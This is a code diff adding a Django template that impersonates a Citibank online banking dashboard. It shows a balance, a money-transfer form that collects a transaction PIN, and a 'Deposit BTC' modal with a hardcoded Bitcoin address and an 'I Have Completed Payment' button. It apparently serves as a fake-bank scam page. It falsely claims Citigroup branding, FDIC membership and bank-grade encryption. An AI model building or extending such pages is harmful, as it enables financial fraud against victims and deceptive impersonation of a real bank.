@@ -1,0 +1,246 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Citi Online - Account Dashboard</title>
+
+    <!-- FontAwesome & Google Fonts -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="{% static 'css/dashboard.css' %}">
+</head>
+<body>
+
+    <!-- Citibank Top Utility Bar -->
+    <div class="citi-utility-bar">
+        <div class="citi-container utility-flex">
+            <div class="utility-left">
+                <span class="active-portal">Personal Banking</span>
+            </div>
+            <div class="utility-right">
+                <a href="#"><i class="fa-solid fa-headset"></i> Support</a>
+                <a href="{% url 'signon' %}"><i class="fa-solid fa-right-from-bracket"></i> Sign Out</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Navigation Header -->
+    <header class="citi-header">
+        <div class="citi-container nav-flex">
+            <a href="#" class="citi-brand">
+                <span class="brand-text">citi</span>
+                <span class="brand-arc"></span>
+            </a>
+            
+            <div class="user-profile-widget">
+                <i class="fa-solid fa-circle-user"></i>
+                <div class="user-info">
+                    <span class="user-greeting">Welcome, <strong>{{ user.userprofile.full_name|default:user.username }}</strong></span>
+                    <span class="last-login">Account Status: <strong class="text-success">Active</strong></span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Dashboard Body -->
+    <main class="citi-container dash-main">
+
+        <!-- Django System Messages -->
+        {% if messages %}
+            <div class="messages-container">
+                {% for message in messages %}
+                    <div class="alert alert-{{ message.tags }}">
+                        <i class="fa-solid fa-circle-info"></i> {{ message }}
+                    </div>
+                {% endfor %}
+            </div>
+        {% endif %}
+
+        <!-- Account Balance & Primary Card -->
+        <section class="citi-card primary-account-box">
+            <div class="account-header">
+                <div>
+                    <span class="account-type-label">CITIBANK CHECKING ACCOUNT</span>
+                    <h2 class="account-number-display">Account #: {{ user.userprofile.account_number|default:"N/A" }}</h2>
+                </div>
+                <div class="balance-display">
+                    <span class="balance-label">Available Balance</span>
+                    <h1 class="balance-amount">{{ user.userprofile.currency }}{{ user.userprofile.balance|default:"0.00" }}</h1>
+                </div>
+            </div>
+
+            <!-- Quick Action Buttons -->
+            <div class="quick-actions-bar">
+                <!-- THIS IS THE IMPORTANT BUTTON -->
+                <button class="quick-btn" onclick="openTransferModal()">
+                    <i class="fa fa-paper-plane"></i> Transfer Money
+                </button>
+
+                <button class="quick-btn" onclick="openCryptoModal()">
+                    <i class="fa-brands fa-bitcoin"></i> Deposit BTC
+                </button>
+
+                <a href="{% url 'verify_pin' %}" class="quick-btn">
+                    <i class="fa-solid fa-shield-halved"></i> Verify PIN
+                </a>
+
+                <a href="{% url 'edit_pin' %}" class="quick-btn">
+                    <i class="fa-solid fa-key"></i> Manage PIN
+                </a>
+            </div>
+        </section>
+
+        <!-- Two Column Dashboard Grid -->
+        <div class="citi-grid">
+
+            <!-- Main Activity Column -->
+            <div class="citi-card grid-main">
+                <div class="card-header">
+                    <h3><i class="fa-solid fa-list-check"></i> Recent Account Activity</h3>
+                </div>
+                <div class="card-body">
+                    <div class="empty-state">
+                        <i class="fa-solid fa-receipt"></i>
+                        <p>No recent transactions recorded on this account.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Sidebar Column -->
+            <div class="grid-sidebar">
+                
+                <!-- Quick Controls -->
+                <div class="citi-card">
+                    <div class="card-header">
+                        <h3><i class="fa-solid fa-sliders"></i> Security Tools</h3>
+                    </div>
+                    <div class="card-body controls-list">
+                        <a href="{% url 'edit_pin' %}" class="control-item">
+                            <div>
+                                <strong>Change Transaction PIN</strong>
+                                <p>Update your secret security code</p>
+                            </div>
+                            <i class="fa-solid fa-chevron-right"></i>
+                        </a>
+                        <a href="{% url 'verify_pin' %}" class="control-item">
+                            <div>
+                                <strong>Pin Verification</strong>
+                                <p>Confirm current access rights</p>
+                            </div>
+                            <i class="fa-solid fa-chevron-right"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- Guarantee Notice -->
+                <div class="citi-card security-badge-card">
+                    <i class="fa-solid fa-shield-halved badge-icon"></i>
+                    <div>
+                        <strong>FDIC Insured & Secure</strong>
+                        <p>Your deposits are backed by Citigroup 256-bit encryption standards.</p>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+    </main>
+
+    <!-- ==========================================================================
+         MODALS (TRANSFER & CRYPTO DEPOSIT)
+         ========================================================================== -->
+
+    <!-- Transfer Money Modal -->
+    <div id="transferModal" class="modal-backdrop">
+        <div class="modal-box">
+            <div class="modal-box-header">
+                <h3><i class="fa fa-paper-plane"></i> Transfer Money</h3>
+                <button type="button" class="btn-close" onclick="closeModal('transferModal')">&times;</button>
+            </div>
+            <form method="POST" action="{% url 'dashboard' %}" class="modal-box-body">
+                {% csrf_token %}
+                <input type="hidden" name="action" value="transfer">
+                
+                <div class="form-group">
+                    <label for="bank_name">Destination Bank</label>
+                    <input type="text" id="bank_name" name="bank_name" class="form-control" placeholder="e.g., Chase, Citi, Bank of America" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="account_number">Recipient Account Number</label>
+                    <input type="text" id="account_number" name="account_number" class="form-control" placeholder="10-12 digit account number" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="account_name">Recipient Full Name</label>
+                    <input type="text" id="account_name" name="account_name" class="form-control" placeholder="Account holder name" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="amount">Transfer Amount (USD)</label>
+                    <input type="number" step="0.01" id="amount" name="amount" class="form-control" placeholder="0.00" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="pin">4-Digit Transaction PIN</label>
+                    <input type="password" maxlength="4" id="pin" name="pin" class="form-control" placeholder="••••" required>
+                </div>
+
+                <div class="modal-box-footer">
+                    <button type="button" class="btn-secondary" onclick="closeModal('transferModal')">Cancel</button>
+                    <button type="submit" class="btn-citi-blue">Execute Transfer</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Deposit BTC Modal -->
+    <div id="cryptoModal" class="modal-backdrop">
+        <div class="modal-box">
+            <div class="modal-box-header">
+                <h3><i class="fa-brands fa-bitcoin"></i> Deposit Crypto (BTC)</h3>
+                <button type="button" class="btn-close" onclick="closeModal('cryptoModal')">&times;</button>
+            </div>
+            <form method="POST" action="{% url 'dashboard' %}" class="modal-box-body">
+                {% csrf_token %}
+                <input type="hidden" name="action" value="deposit">
+
+                <div class="qr-code-wrapper">
+                    <img src="{% static 'btc_qr.jpg' %}" alt="BTC QR Code" class="btc-qr-img">
+                </div>
+
+                <div class="form-group">
+                    <label>Bitcoin (BTC) Deposit Address</label>
+                    <div class="input-copy-group">
+                        <input type="text" id="btcAddress" value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" readonly class="form-control">
+                        <button type="button" class="btn-copy" onclick="copyBTC()"><i class="fa-solid fa-copy"></i> Copy</button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="usd_amount">Deposit Value (USD Equivalent)</label>
+                    <input type="number" step="0.01" id="usd_amount" name="amount" class="form-control" placeholder="e.g. 500.00" required>
+                </div>
+
+                <div class="modal-box-footer">
+                    <button type="button" class="btn-secondary" onclick="closeModal('cryptoModal')">Cancel</button>
+                    <button type="submit" class="btn-citi-blue">I Have Completed Payment</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="citi-footer">
+        <div class="citi-container">
+            <p>&copy; {% now "Y" %} Citigroup Inc. Member FDIC. Equal Housing Lender.</p>
+        </div>
+    </footer>
+
+    <script src="{% static 'js/dashboard.js' %}"></script>
+</body>
+</html>
